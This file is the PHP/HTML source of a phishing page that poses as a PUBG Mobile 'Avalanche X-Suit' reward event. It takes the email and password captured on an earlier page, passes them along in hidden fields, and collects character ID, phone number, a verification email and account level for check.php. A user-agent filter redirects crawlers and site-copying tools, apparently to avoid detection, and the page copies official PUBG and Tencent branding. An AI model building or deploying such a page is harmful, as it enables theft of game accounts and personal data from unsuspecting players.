<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>

<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE: Avalanche X-Suit">
<meta name="description" content="Collect your special rewards at the Avalanche X-Suit event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the Avalanche X-Suit event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE: Avalanche X-Suit">
<meta property="og:type" content="website">
<meta name="copyright" content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://i.ibb.co/DpRp888/Pics-Art-10-26-09-57-02.jpg">
<title>PUBG MOBILE: Avalanche X-Suit</title>
<link rel="stylesheet" href="css/style.css">
<link rel="icon" href="https://i.ibb.co/DpRp888/Pics-Art-10-26-09-57-02.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="container">

<div class="header">
<video src="https://github.com/jefanya14/pubg-spin-v45/raw/main/media/pubgm.mp4" autoplay loop muted></video>
</div> 
<div class="alert">
</div> 
<div class="box">
<div class="event-alert">
<div class="event-alert-title"></div>
<div class="event-alert-desc"></div>
</div>
<div class="menu-wrapper-border"></div>
<div class="tab_rewards" id="latest">
<center>
<form action="check.php" method="post">
<input type="hidden" class="input-anjir" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="number" class="input-anjir" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" class="input-anjir" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
<input type="name" class="input-anjir" name="vmail" id="phone" placeholder="Verif Email" autocomplete="off" required>
<select class="select-anjir" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<button type="submit" class="finish-btn" onmousedown="buka.play()">Verify my Account</button>
</form>
</center>
</div> 
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> 
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/wN1GcSg/1635252653538.png">
<div class="footer-txt-copyright">â“’ 2017 KRAFTON, Inc. All rights reserved.</div> 
<div class="footer-txt-copyright">â“’ 2018-2021 Tencent. All rights reserved.</div> 
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> 
</div> 
</div> 
<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/click.js"></script>
</body>
<link href="https://awd.jefanyaefandchr.repl.co/aman.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman1.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman2.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman3.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman4.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman5.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman6.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman7.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman8.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman9.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman10.css" rel="stylesheet" type="text/css" />
</html>